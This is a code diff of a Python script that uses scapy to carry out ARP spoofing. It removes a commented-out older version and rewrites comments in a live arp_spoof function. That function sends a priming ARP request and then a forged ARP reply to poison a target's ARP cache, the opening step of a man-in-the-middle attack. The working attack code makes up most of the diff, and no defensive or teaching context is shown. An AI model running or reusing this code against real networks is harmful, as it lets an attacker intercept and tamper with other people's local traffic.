@@ -3,18 +3,13 @@ import shlex
 import threading
 import time
 
-# ARP spoofing
-# def arp_spoof(target_ip, spoofed_ip):
-#     packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
-#     sc.send(packet, verbose=False)
 def arp_spoof(target_ip, spoofed_ip):
-    # 1. Send ARP request to "prime" the target's ARP table
-    # Emulate spoofed_ip asking "who has target_ip?"
+    # Send ARP request to "prime" the target's ARP table - spoofed_ip asking "who has target_ip?"
     request = sc.ARP(op=1, pdst=target_ip, psrc=spoofed_ip)
     sc.send(request, verbose=False)
-    time.sleep(1)  # give the target time to respond and populate its ARP table
+    time.sleep(1)
 
-    # 2. Send the spoofed ARP reply
+    # Send the spoofed ARP reply to poison the target table
     reply = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
     sc.send(reply, verbose=False)
 
